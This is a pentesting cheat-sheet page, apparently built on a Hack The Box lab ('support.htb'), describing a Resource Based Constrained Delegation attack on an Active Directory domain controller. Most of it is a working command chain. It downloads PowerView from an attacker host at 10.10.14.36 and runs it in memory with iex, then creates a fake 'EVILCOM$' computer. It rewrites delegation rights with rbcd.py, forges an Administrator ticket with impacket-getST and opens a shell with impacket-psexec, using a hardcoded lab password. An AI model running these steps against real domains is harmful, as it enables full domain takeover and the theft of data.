# Resource Based Constrained Delegation

{% embed url="https://hakin9.org/rbcd-attack-kerberos-resource-based-constrained-delegation-attack-from-outside-using-impacket" %}

In a nutshell, through a Resource Based Constrained Delegation attack we can add a computer under our control to the domain.

The attack relies on three prerequisites:&#x20;

* We need a shell or code execution as a domain user that belongs to the Authenticated Users group. By default any member of this group can add up to 10 computers to the domain.&#x20;
* The ms-ds-machineaccountquota attribute needs to be higher than 0. This attribute controls the amount of computers that authenticated domain users can add to the domain.&#x20;
* A user or a group is a member of, needs to have WRITE privileges ( GenericAll , WriteDACL) over a domain joined computer (in this case the Domain Controller)

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

## Linux based Attack Commands

### Enumeration

{% code overflow="wrap" %}
```bash
# Check if MS-ds-machineaccountquota has more than 0
# If the output of the command below shows that this attribute is set to 10, this means each authenticated domain user can add up to 10 computers to the domain.

PS> Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota

# Verify that the msds-allowedtoactonbehalfofotheridentity attribute is empty. 

PS> iex (new-Object Net.WebClient).DownloadString('http://10.10.14.36/privesc/PowerView.ps1')|Import-Module PowerView.ps1

PS> Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity

# The following output shows that the value is empty. Now it is ready to attack. 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>



### Exploitation&#x20;

1. **Download the tool.** [https://github.com/tothi/rbcd-attack/blob/master/rbcd.py](https://github.com/tothi/rbcd-attack/blob/master/rbcd.py)
2. **Creating a fake computer**

{% code overflow="wrap" %}
```bash
# Kali
addcomputer.py -computer-name 'EVILCOM$' -computer-pass password -dc-ip $RHOST support/support:Ironside47pleasure40Watchful
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

3. **Modifying delegation rights**

Implemented the script [rbcd.py](https://github.com/tothi/rbcd-attack/blob/master/rbcd.py) found here in the repo which adds the related security descriptor of the newly created EVILCOMPUTER to the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the target computer.

{% code overflow="wrap" %}
```bash
# Use the rbcd.py downloaded above 
./rbcd.py  -f EVILCOM -t DC -dc-ip $RHOST support\\support:Ironside47pleasure40Watchful
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

4. Getting Impersonated Service Ticket

{% code overflow="wrap" %}
```bash
# Kali 
impacket-getST -spn cifs/DC.support.htb -impersonate Administrator -dc-ip $RHOST support/EVILCOM$:password
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

5. Injecting Ticket into memory&#x20;

```bash
# Kali
export KRB5CCNAME=./Administrator.ccache
Klist
```

<figure><img src="../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

6. Running PSEXEC command.&#x20;

{% code overflow="wrap" %}
```bash
# Kali
 impacket-psexec -k DC.support.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>
